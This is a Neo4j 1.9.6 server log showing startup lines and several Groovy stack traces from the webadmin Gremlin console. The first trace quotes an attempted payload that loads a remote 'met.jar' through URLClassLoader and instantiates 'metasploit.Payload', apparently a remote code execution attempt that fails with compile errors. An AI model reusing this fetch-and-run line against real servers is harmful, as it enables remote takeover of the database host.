2014-02-16 20:27:36.212+0000 INFO  [API] Setting startup timeout to: 120000ms based on -1
2014-02-16 20:27:36.845+0000 INFO  [API] Successfully started database
2014-02-16 20:27:36.860+0000 INFO  [API] Starting HTTP on port :7474 with 80 threads available
2014-02-16 20:27:37.004+0000 INFO  [API] Enabling HTTPS on port :7473
2014-02-16 20:27:37.005+0000 INFO  [API] No SSL certificate found, generating a self-signed certificate..
2014-02-16 20:27:37.472+0000 INFO  [API] Mounted discovery module at [/]
2014-02-16 20:27:37.502+0000 INFO  [API] Loaded server plugin "CypherPlugin"
2014-02-16 20:27:37.504+0000 INFO  [API] Loaded server plugin "GremlinPlugin"
2014-02-16 20:27:37.505+0000 INFO  [API] Mounted REST API at [/db/data/]
2014-02-16 20:27:37.507+0000 INFO  [API] Mounted management API at [/db/manage/]
2014-02-16 20:27:37.545+0000 INFO  [API] Mounted webadmin at [/webadmin]
2014-02-16 20:27:37.574+0000 INFO  [API] Mounting static content at [/webadmin] from [webadmin-html]
2014-02-16 20:27:38.636+0000 INFO  [API] Remote interface ready and available at [http://localhost:7474/]
2014-02-16 20:32:25.161+0000 INFO  [API] Available console sessions: SHELL: class org.neo4j.server.webadmin.console.ShellSessionCreator
CYPHER: class org.neo4j.server.webadmin.console.CypherSessionCreator
GREMLIN: class org.neo4j.server.webadmin.console.GremlinSessionCreator

2014-02-16 20:48:55.138+0000 DEBUG [API] 
org.codehaus.groovy.control.MultipleCompilationErrorsException: startup failed:
groovysh_evaluate: 52: No expression for the array constructor call at line: 52 column: 27. File: groovysh_evaluate @ line 52, column 27.
   new URLClassLoader(new URL[]{new URL("http://localhost/~alvaro/met.jar")}).loadClass("metasploit.Payload").newInstance()
                             ^

1 error

	at org.codehaus.groovy.control.ErrorCollector.failIfErrors(ErrorCollector.java:302) ~[groovy-1.8.5.jar:1.8.5]
	at org.codehaus.groovy.control.CompilationUnit.applyToSourceUnits(CompilationUnit.java:858) ~[groovy-1.8.5.jar:1.8.5]
	at org.codehaus.groovy.control.CompilationUnit.doPhaseOperation(CompilationUnit.java:548) ~[groovy-1.8.5.jar:1.8.5]
	at org.codehaus.groovy.control.CompilationUnit.processPhaseOperations(CompilationUnit.java:524) ~[groovy-1.8.5.jar:1.8.5]
	at org.codehaus.groovy.control.CompilationUnit.compile(CompilationUnit.java:501) ~[groovy-1.8.5.jar:1.8.5]
	at groovy.lang.GroovyClassLoader.doParseClass(GroovyClassLoader.java:306) ~[groovy-1.8.5.jar:1.8.5]
	at groovy.lang.GroovyClassLoader.parseClass(GroovyClassLoader.java:287) ~[groovy-1.8.5.jar:1.8.5]
	at groovy.lang.GroovyShell.parseClass(GroovyShell.java:731) ~[groovy-1.8.5.jar:1.8.5]
	at groovy.lang.GroovyShell.parse(GroovyShell.java:743) ~[groovy-1.8.5.jar:1.8.5]
	at groovy.lang.GroovyShell.parse(GroovyShell.java:770) ~[groovy-1.8.5.jar:1.8.5]
	at groovy.lang.GroovyShell$parse.call(Unknown Source) ~[na:na]
	at org.codehaus.groovy.tools.shell.Interpreter.evaluate(Interpreter.groovy:61) ~[groovy-1.8.5.jar:1.8.5]
	at org.codehaus.groovy.tools.shell.Interpreter$evaluate.call(Unknown Source) ~[na:na]
	at org.codehaus.groovy.tools.shell.Groovysh.execute(Groovysh.groovy:152) ~[groovy-1.8.5.jar:1.8.5]
	at org.neo4j.server.webadmin.console.GremlinWebConsole.execute(GremlinWebConsole.java:61) ~[neo4j-gremlin-plugin-1.9.6.jar:1.9.6]
	at org.neo4j.server.webadmin.console.GremlinSession.evaluate(GremlinSession.java:102) ~[neo4j-gremlin-plugin-1.9.6.jar:1.9.6]
	at org.neo4j.server.webadmin.rest.console.ConsoleService.exec(ConsoleService.java:125) [neo4j-server-1.9.6.jar:1.9.6]
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.7.0_21]
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) ~[na:1.7.0_21]
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.7.0_21]
	at java.lang.reflect.Method.invoke(Method.java:601) ~[na:1.7.0_21]
	at com.sun.jersey.spi.container.JavaMethodInvokerFactory$1.invoke(JavaMethodInvokerFactory.java:60) [jersey-server-1.9.jar:1.9]
	at com.sun.jersey.server.impl.model.method.dispatch.AbstractResourceMethodDispatchProvider$ResponseOutInvoker._dispatch(AbstractResourceMethodDispatchProvider.java:205) [jersey-server-1.9.jar:1.9]
	at com.sun.jersey.server.impl.model.method.dispatch.ResourceJavaMethodDispatcher.dispatch(ResourceJavaMethodDispatcher.java:75) [jersey-server-1.9.jar:1.9]
	at com.sun.jersey.server.impl.uri.rules.HttpMethodRule.accept(HttpMethodRule.java:288) [jersey-server-1.9.jar:1.9]
	at com.sun.jersey.server.impl.uri.rules.ResourceClassRule.accept(ResourceClassRule.java:108) [jersey-server-1.9.jar:1.9]
	at com.sun.jersey.server.impl.uri.rules.RightHandPathRule.accept(RightHandPathRule.java:147) [jersey-server-1.9.jar:1.9]
	at com.sun.jersey.server.impl.uri.rules.RootResourceClassesRule.accept(RootResourceClassesRule.java:84) [jersey-server-1.9.jar:1.9]
	at com.sun.jersey.server.impl.application.WebApplicationImpl._handleRequest(WebApplicationImpl.java:1469) [jersey-server-1.9.jar:1.9]
	at com.sun.jersey.server.impl.application.WebApplicationImpl._handleRequest(WebApplicationImpl.java:1400) [jersey-server-1.9.jar:1.9]
	at com.sun.jersey.server.impl.application.WebApplicationImpl.handleRequest(WebApplicationImpl.java:1349) [jersey-server-1.9.jar:1.9]
	at com.sun.jersey.server.impl.application.WebApplicationImpl.handleRequest(WebApplicationImpl.java:1339) [jersey-server-1.9.jar:1.9]
	at com.sun.jersey.spi.container.servlet.WebComponent.service(WebComponent.java:416) [jersey-server-1.9.jar:1.9]
	at com.sun.jersey.spi.container.servlet.ServletContainer.service(ServletContainer.java:537) [jersey-server-1.9.jar:1.9]
	at com.sun.jersey.spi.container.servlet.ServletContainer.service(ServletContainer.java:699) [jersey-server-1.9.jar:1.9]
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:820) [servlet-api-2.5-20081211.jar:na]
	at org.mortbay.jetty.servlet.ServletHolder.handle(ServletHolder.java:511) [jetty-6.1.25.jar:6.1.25]
	at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1166) [jetty-6.1.25.jar:6.1.25]
	at org.neo4j.server.rest.security.SecurityFilter.doFilter(SecurityFilter.java:112) [neo4j-server-1.9.6.jar:1.9.6]
	at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1157) [jetty-6.1.25.jar:6.1.25]
	at org.mortbay.jetty.servlet.ServletHandler.handle(ServletHandler.java:388) [jetty-6.1.25.jar:6.1.25]
	at org.mortbay.jetty.servlet.SessionHandler.handle(SessionHandler.java:182) [jetty-6.1.25.jar:6.1.25]
	at org.mortbay.jetty.handler.ContextHandler.handle(ContextHandler.java:765) [jetty-6.1.25.jar:6.1.25]
	at org.mortbay.jetty.handler.HandlerCollection.handle(HandlerCollection.java:114) [jetty-6.1.25.jar:6.1.25]
	at org.mortbay.jetty.handler.HandlerWrapper.handle(HandlerWrapper.java:152) [jetty-6.1.25.jar:6.1.25]
	at org.mortbay.jetty.Server.handle(Server.java:322) [jetty-6.1.25.jar:6.1.25]
	at org.mortbay.jetty.HttpConnection.handleRequest(HttpConnection.java:542) [jetty-6.1.25.jar:6.1.25]
	at org.mortbay.jetty.HttpConnection$RequestHandler.content(HttpConnection.java:943) [jetty-6.1.25.jar:6.1.25]
	at org.mortbay.jetty.HttpParser.parseNext(HttpParser.java:756) [jetty-6.1.25.jar:6.1.25]
	at org.mortbay.jetty.HttpParser.parseAvailable(HttpParser.java:218) [jetty-6.1.25.jar:6.1.25]
	at org.mortbay.jetty.HttpConnection.handle(HttpConnection.java:404) [jetty-6.1.25.jar:6.1.25]
	at org.mortbay.io.nio.SelectChannelEndPoint.run(SelectChannelEndPoint.java:410) [jetty-6.1.25.jar:6.1.25]
	at org.mortbay.thread.QueuedThreadPool$PoolThread.run(QueuedThreadPool.java:582) [jetty-util-6.1.25.jar:6.1.25]
2014-02-16 20:50:50.256+0000 DEBUG [API] 
groovy.lang.GroovyRuntimeException: Could not find matching constructor for: java.net.URLClassLoader(java.util.ArrayList)
	at groovy.lang.MetaClassImpl.invokeConstructor(MetaClassImpl.java:1466) ~[groovy-1.8.5.jar:1.8.5]
	at groovy.lang.MetaClassImpl.invokeConstructor(MetaClassImpl.java:1382) ~[groovy-1.8.5.jar:1.8.5]
	at org.codehaus.groovy.runtime.callsite.MetaClassConstructorSite.callConstructor(MetaClassConstructorSite.java:46) ~[groovy-1.8.5.jar:1.8.5]
	at org.codehaus.groovy.runtime.callsite.CallSiteArray.defaultCallConstructor(CallSiteArray.java:54) ~[groovy-1.8.5.jar:1.8.5]
	at org.codehaus.groovy.runtime.callsite.AbstractCallSite.callConstructor(AbstractCallSite.java:182) ~[groovy-1.8.5.jar:1.8.5]
	at org.codehaus.groovy.runtime.callsite.AbstractCallSite.callConstructor(AbstractCallSite.java:190) ~[groovy-1.8.5.jar:1.8.5]
	at groovysh_evaluate.run(groovysh_evaluate:52) ~[na:na]
	at groovysh_evaluate$run.call(Unknown Source) ~[na:na]
	at org.codehaus.groovy.runtime.callsite.CallSiteArray.defaultCall(CallSiteArray.java:42) ~[groovy-1.8.5.jar:1.8.5]
	at groovysh_evaluate$run.call(Unknown Source) ~[na:na]
	at org.codehaus.groovy.tools.shell.Interpreter.evaluate(Interpreter.groovy:67) ~[groovy-1.8.5.jar:1.8.5]
	at org.codehaus.groovy.tools.shell.Interpreter$evaluate.call(Unknown Source) ~[na:na]
	at org.codehaus.groovy.tools.shell.Groovysh.execute(Groovysh.groovy:152) ~[groovy-1.8.5.jar:1.8.5]
	at org.neo4j.server.webadmin.console.GremlinWebConsole.execute(GremlinWebConsole.java:61) ~[neo4j-gremlin-plugin-1.9.6.jar:1.9.6]
	at org.neo4j.server.webadmin.console.GremlinSession.evaluate(GremlinSession.java:102) ~[neo4j-gremlin-plugin-1.9.6.jar:1.9.6]
	at org.neo4j.server.webadmin.rest.console.ConsoleService.exec(ConsoleService.java:125) [neo4j-server-1.9.6.jar:1.9.6]
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.7.0_21]
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) ~[na:1.7.0_21]
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.7.0_21]
	at java.lang.reflect.Method.invoke(Method.java:601) ~[na:1.7.0_21]
	at com.sun.jersey.spi.container.JavaMethodInvokerFactory$1.invoke(JavaMethodInvokerFactory.java:60) [jersey-server-1.9.jar:1.9]
	at com.sun.jersey.server.impl.model.method.dispatch.AbstractResourceMethodDispatchProvider$ResponseOutInvoker._dispatch(AbstractResourceMethodDispatchProvider.java:205) [jersey-server-1.9.jar:1.9]
	at com.sun.jersey.server.impl.model.method.dispatch.ResourceJavaMethodDispatcher.dispatch(ResourceJavaMethodDispatcher.java:75) [jersey-server-1.9.jar:1.9]
	at com.sun.jersey.server.impl.uri.rules.HttpMethodRule.accept(HttpMethodRule.java:288) [jersey-server-1.9.jar:1.9]
	at com.sun.jersey.server.impl.uri.rules.ResourceClassRule.accept(ResourceClassRule.java:108) [jersey-server-1.9.jar:1.9]
	at com.sun.jersey.server.impl.uri.rules.RightHandPathRule.accept(RightHandPathRule.java:147) [jersey-server-1.9.jar:1.9]
	at com.sun.jersey.server.impl.uri.rules.RootResourceClassesRule.accept(RootResourceClassesRule.java:84) [jersey-server-1.9.jar:1.9]
	at com.sun.jersey.server.impl.application.WebApplicationImpl._handleRequest(WebApplicationImpl.java:1469) [jersey-server-1.9.jar:1.9]
	at com.sun.jersey.server.impl.application.WebApplicationImpl._handleRequest(WebApplicationImpl.java:1400) [jersey-server-1.9.jar:1.9]
	at com.sun.jersey.server.impl.application.WebApplicationImpl.handleRequest(WebApplicationImpl.java:1349) [jersey-server-1.9.jar:1.9]
	at com.sun.jersey.server.impl.application.WebApplicationImpl.handleRequest(WebApplicationImpl.java:1339) [jersey-server-1.9.jar:1.9]
	at com.sun.jersey.spi.container.servlet.WebComponent.service(WebComponent.java:416) [jersey-server-1.9.jar:1.9]
	at com.sun.jersey.spi.container.servlet.ServletContainer.service(ServletContainer.java:537) [jersey-server-1.9.jar:1.9]
	at com.sun.jersey.spi.container.servlet.ServletContainer.service(ServletContainer.java:699) [jersey-server-1.9.jar:1.9]
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:820) [servlet-api-2.5-20081211.jar:na]
	at org.mortbay.jetty.servlet.ServletHolder.handle(ServletHolder.java:511) [jetty-6.1.25.jar:6.1.25]
	at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1166) [jetty-6.1.25.jar:6.1.25]
	at org.neo4j.server.rest.security.SecurityFilter.doFilter(SecurityFilter.java:112) [neo4j-server-1.9.6.jar:1.9.6]
	at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1157) [jetty-6.1.25.jar:6.1.25]
	at org.mortbay.jetty.servlet.ServletHandler.handle(ServletHandler.java:388) [jetty-6.1.25.jar:6.1.25]
	at org.mortbay.jetty.servlet.SessionHandler.handle(SessionHandler.java:182) [jetty-6.1.25.jar:6.1.25]
	at org.mortbay.jetty.handler.ContextHandler.handle(ContextHandler.java:765) [jetty-6.1.25.jar:6.1.25]
	at org.mortbay.jetty.handler.HandlerCollection.handle(HandlerCollection.java:114) [jetty-6.1.25.jar:6.1.25]
	at org.mortbay.jetty.handler.HandlerWrapper.handle(HandlerWrapper.java:152) [jetty-6.1.25.jar:6.1.25]
	at org.mortbay.jetty.Server.handle(Server.java:322) [jetty-6.1.25.jar:6.1.25]
	at org.mortbay.jetty.HttpConnection.handleRequest(HttpConnection.java:542) [jetty-6.1.25.jar:6.1.25]
	at org.mortbay.jetty.HttpConnection$RequestHandler.content(HttpConnection.java:943) [jetty-6.1.25.jar:6.1.25]
	at org.mortbay.jetty.HttpParser.parseNext(HttpParser.java:756) [jetty-6.1.25.jar:6.1.25]
	at org.mortbay.jetty.HttpParser.parseAvailable(HttpParser.java:218) [jetty-6.1.25.jar:6.1.25]
	at org.mortbay.jetty.HttpConnection.handle(HttpConnection.java:404) [jetty-6.1.25.jar:6.1.25]
	at org.mortbay.io.nio.SelectChannelEndPoint.run(SelectChannelEndPoint.java:410) [jetty-6.1.25.jar:6.1.25]
	at org.mortbay.thread.QueuedThreadPool$PoolThread.run(QueuedThreadPool.java:582) [jetty-util-6.1.25.jar:6.1.25]
2014-02-16 20:54:32.732+0000 DEBUG [API] 
groovy.lang.MissingMethodException: No signature of method: java.net.URL.toArray() is applicable for argument types: () values: []
Possible solutions: toURI(), notify(), toString(), toString(), toString(), every()
	at org.codehaus.groovy.runtime.ScriptBytecodeAdapter.unwrap(ScriptBytecodeAdapter.java:55) ~[groovy-1.8.5.jar:1.8.5]
	at org.codehaus.groovy.runtime.callsite.PojoMetaClassSite.call(PojoMetaClassSite.java:46) ~[groovy-1.8.5.jar:1.8.5]
	at org.codehaus.groovy.runtime.callsite.CallSiteArray.defaultCall(CallSiteArray.java:42) ~[groovy-1.8.5.jar:1.8.5]
	at org.codehaus.groovy.runtime.callsite.AbstractCallSite.call(AbstractCallSite.java:108) ~[groovy-1.8.5.jar:1.8.5]
	at org.codehaus.groovy.runtime.callsite.AbstractCallSite.call(AbstractCallSite.java:112) ~[groovy-1.8.5.jar:1.8.5]
	at groovysh_evaluate.run(groovysh_evaluate:52) ~[na:na]
	at groovysh_evaluate$run.call(Unknown Source) ~[na:na]
	at org.codehaus.groovy.runtime.callsite.CallSiteArray.defaultCall(CallSiteArray.java:42) ~[groovy-1.8.5.jar:1.8.5]
	at groovysh_evaluate$run.call(Unknown Source) ~[na:na]
	at org.codehaus.groovy.tools.shell.Interpreter.evaluate(Interpreter.groovy:67) ~[groovy-1.8.5.jar:1.8.5]
	at org.codehaus.groovy.tools.shell.Interpreter$evaluate.call(Unknown Source) ~[na:na]
	at org.codehaus.groovy.tools.shell.Groovysh.execute(Groovysh.groovy:152) ~[groovy-1.8.5.jar:1.8.5]
	at org.neo4j.server.webadmin.console.GremlinWebConsole.execute(GremlinWebConsole.java:61) ~[neo4j-gremlin-plugin-1.9.6.jar:1.9.6]
	at org.neo4j.server.webadmin.console.GremlinSession.evaluate(GremlinSession.java:102) ~[neo4j-gremlin-plugin-1.9.6.jar:1.9.6]
	at org.neo4j.server.webadmin.rest.console.ConsoleService.exec(ConsoleService.java:125) [neo4j-server-1.9.6.jar:1.9.6]
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.7.0_21]
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) ~[na:1.7.0_21]
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.7.0_21]
	at java.lang.reflect.Method.invoke(Method.java:601) ~[na:1.7.0_21]
	at com.sun.jersey.spi.container.JavaMethodInvokerFactory$1.invoke(JavaMethodInvokerFactory.java:60) [jersey-server-1.9.jar:1.9]
	at com.sun.jersey.server.impl.model.method.dispatch.AbstractResourceMethodDispatchProvider$ResponseOutInvoker._dispatch(AbstractResourceMethodDispatchProvider.java:205) [jersey-server-1.9.jar:1.9]
	at com.sun.jersey.server.impl.model.method.dispatch.ResourceJavaMethodDispatcher.dispatch(ResourceJavaMethodDispatcher.java:75) [jersey-server-1.9.jar:1.9]
	at com.sun.jersey.server.impl.uri.rules.HttpMethodRule.accept(HttpMethodRule.java:288) [jersey-server-1.9.jar:1.9]
	at com.sun.jersey.server.impl.uri.rules.ResourceClassRule.accept(ResourceClassRule.java:108) [jersey-server-1.9.jar:1.9]
	at com.sun.jersey.server.impl.uri.rules.RightHandPathRule.accept(RightHandPathRule.java:147) [jersey-server-1.9.jar:1.9]
